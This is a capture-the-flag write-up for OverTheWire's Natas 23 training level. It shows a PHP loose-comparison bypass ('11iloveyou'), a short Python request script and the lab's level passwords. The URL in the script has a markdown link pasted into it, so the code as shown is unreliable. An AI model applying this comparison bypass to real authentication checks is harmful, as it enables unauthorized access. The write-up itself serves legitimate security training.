# Natas 22 - Natas 23
    Username  : natas23
    Password  : dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
    URL       : http://natas23.natas.labs.overthewire.org
# Solution

Looking at the source code:
```
if(array_key_exists("passwd",$_REQUEST)){
    if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
        echo "The credentials for the next level are:<br>";
        echo "<pre>Username: natas24 Password: <censored></pre>";
    }
}
```
The password must contain "iloveyou" AND be greater than 10 (numeric comparison). In PHP, when comparing a string to an integer, it converts the string to a number by taking leading digits.

So 11iloveyou becomes 11 in numeric comparison, which is > 10, and it contains "iloveyou".

Using the python script :
```
import requests

url = "[natas23.natas.labs.overthewire.org](http://natas23.natas.labs.overthewire.org/)"
auth = ("natas23", "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs")

r = requests.get(url, auth=auth, params={"passwd": "11iloveyou"})
print(r.text)

```
Run the above python script to obtain the password for next level

# Password 
     MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
